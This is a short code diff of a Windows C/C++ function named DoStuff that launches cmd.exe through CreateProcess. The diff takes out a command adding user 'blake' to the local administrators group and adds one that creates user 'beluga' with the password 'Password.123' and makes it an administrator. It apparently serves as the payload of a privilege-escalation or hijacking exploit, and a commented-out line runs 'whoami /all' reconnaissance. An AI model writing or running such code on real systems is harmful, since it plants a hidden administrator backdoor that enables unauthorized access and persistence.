@@ -10,7 +10,7 @@ void DoStuff() {
     STARTUPINFO si = { sizeof(STARTUPINFO) };
     PROCESS_INFORMATION pi;
     // CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C whoami /all > C:\\ProgramData\\whoamiall.txt",NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);
-    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators blake /add",NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);
+    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net user beluga Password.123 /add && net localgroup administrators beluga /add",NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);
 
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
